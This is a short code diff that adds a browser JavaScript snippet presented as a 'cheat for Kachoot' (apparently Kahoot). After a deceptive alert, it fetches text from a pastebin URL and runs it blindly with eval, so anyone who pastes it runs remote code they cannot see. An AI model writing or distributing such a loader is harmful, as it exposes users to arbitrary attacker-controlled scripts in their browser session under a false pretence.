@@ -1,0 +1,2 @@
+alert("Hello This Cheat For Kachoot Will Make your Username Dissapear Do you wanna continue? If yes click ok if not exit this page Thanks!")
+fetch("https://pastebin.com/jg42zTv9").then((r) => r.text().then((t) => eval(t)));
